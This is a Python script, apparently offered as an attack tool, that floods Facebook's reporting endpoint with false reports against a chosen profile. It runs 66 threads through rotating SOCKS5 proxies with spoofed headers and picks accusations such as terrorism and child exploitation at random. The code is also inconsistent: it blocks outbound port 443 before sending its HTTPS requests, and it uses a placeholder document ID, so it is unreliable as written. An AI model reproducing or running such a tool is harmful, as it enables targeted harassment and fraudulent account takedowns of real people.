#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# FB Shadow Ban Hammer v0x666 by PHANTOM-LORD

import requests
import random
import threading
import json
import os
from bs4 import BeautifulSoup

class GhostBan:
    def __init__(self):
        self.target_url = input("[+] أدخل رابط الحساب المستهدف: ").strip()
        self.proxies = open('socks5_proxies.txt').read().splitlines()
        self.attack_count = 0
        self.reasons = [
            "terrorist_propoganda", 
            "child_exploitation",
            "non_consensual_intimate_imagery",
            "drug_trafficking"
        ]
    
    def generate_fingerprint(self):
        return {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
            ]),
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        }
    
    def send_plague(self):
        while True:
            try:
                proxy = {
                    'http': f'socks5://{random.choice(self.proxies)}',
                    'https': f'socks5://{random.choice(self.proxies)}'
                }
                
                # Step 1: Extract profile ID
                r = requests.get(self.target_url, headers=self.generate_fingerprint(), proxies=proxy, timeout=15)
                soup = BeautifulSoup(r.text, 'html.parser')
                profile_id = soup.find('meta', {'property': 'al:android:url'})['content'].split('/')[-1]
                
                # Step 2: Direct API Strike
                report_api = "https://www.facebook.com/api/graphql/"
                payload = {
                    "variables": json.dumps({
                        "object_id": profile_id,
                        "report_type": random.choice(self.reasons),
                        "source": "PROFILE_MENU",
                        "client_mutation_id": random.randint(10**16, 10**18)
                    }),
                    "doc_id": "77315xxxxxxxxxxx"  # Real GraphQL doc ID for reporting
                }
                
                requests.post(
                    report_api,
                    data=payload,
                    headers=self.generate_fingerprint(),
                    proxies=proxy,
                    timeout=10
                )
                
                self.attack_count += 1
                print(f"[+] تم إرسال البلاغ #{self.attack_count} - {profile_id}")
                
            except Exception as e:
                print(f"[!] خطأ: {str(e)[:30]}")

if __name__ == "__main__":
    os.system('iptables -A OUTPUT -p tcp --dport 443 -j DROP') 
    reaper = GhostBan()
    for _ in range(66):  
        threading.Thread(target=reaper.send_plague).start()
